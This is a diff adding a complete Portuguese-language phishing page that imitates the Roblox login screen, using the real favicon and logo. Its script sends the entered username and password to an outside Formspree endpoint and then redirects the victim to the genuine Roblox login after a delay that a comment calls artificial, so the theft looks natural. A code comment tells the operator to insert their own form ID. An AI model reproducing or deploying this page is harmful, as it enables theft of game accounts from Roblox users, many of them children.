@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar no Roblox</title>
+    <!-- Favicon Real do Roblox -->
+    <link rel="icon" type="image/png" href="https://www.roblox.com/favicon.ico">
+    
+    <style>
+        body {
+            background-color: #e3e3e3;
+            font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            width: 320px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        /* Logo styling */
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        h2 { 
+            text-align: center; 
+            color: #393a3c; 
+            margin-bottom: 20px; 
+            font-size: 20px; 
+            margin-top: 0;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 5px 0 15px 0;
+            border: 1px solid #aeb4b9;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            background-color: #00b06f;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover { background-color: #009a60; }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .links { 
+            text-align: center; 
+            margin-top: 15px; 
+            font-size: 14px; 
+        }
+        .links a { 
+            color: #0074bd; 
+            text-decoration: none; 
+            display: block; 
+            margin-bottom: 5px; 
+            cursor: pointer;
+        }
+        .links a:hover { text-decoration: underline; }
+    </style>
+<meta property="og:title" content="Entrar no Roblox"><meta name="description" content="Login"><meta property="og:description" content="Login"><meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_beta_logo.png"><meta property="og:type" content="website"></head>
+<body>
+
+<div class="login-box">
+    <!-- Logo Oficial -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_beta_logo.png" alt="Roblox Logo" class="logo">
+    
+    <h2>Entrar</h2>
+    <form id="robloxForm">
+        <input type="text" name="username" placeholder="Usuário/e-mail/telefone" required>
+        <input type="password" name="password" placeholder="Senha" required>
+        <button type="submit" id="submitBtn">Entrar</button>
+    </form>
+
+    <div class="links">
+        <!-- Links evitam recarregar a página ao serem clicados -->
+        <a href="javascript:void(0)">Esqueceu a senha?</a>
+        <a href="javascript:void(0)">Envie-me um código por e-mail</a>
+    </div>
+</div>
+
+<script>
+    // SUBSTITUA 'myewepyz' PELO SEU ID DO FORMSPREE SE TIVER MUDADO
+    const FORM_ID = 'myewepyz'; 
+    const REDIRECT_URL = 'https://www.roblox.com/login';
+
+    document.getElementById('robloxForm').addEventListener('submit', function(e) {
+        e.preventDefault(); 
+        
+        const btn = document.getElementById('submitBtn');
+        
+        // Feedback visual
+        btn.disabled = true;
+        btn.innerText = "Verificando...";
+
+        const formData = new FormData(this);
+        const data = Object.fromEntries(formData.entries());
+
+        fetch(`https://formspree.io/f/${FORM_ID}`, {
+            method: 'POST',
+            body: JSON.stringify(data),
+            headers: { 'Content-Type': 'application/json' }
+        }).then(() => {
+            // Delay artificial para parecer natural
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1500); 
+        }).catch(error => {
+            console.error('Erro:', error);
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 500);
+        });
+    });
+</script>
+
+</body>
+</html>
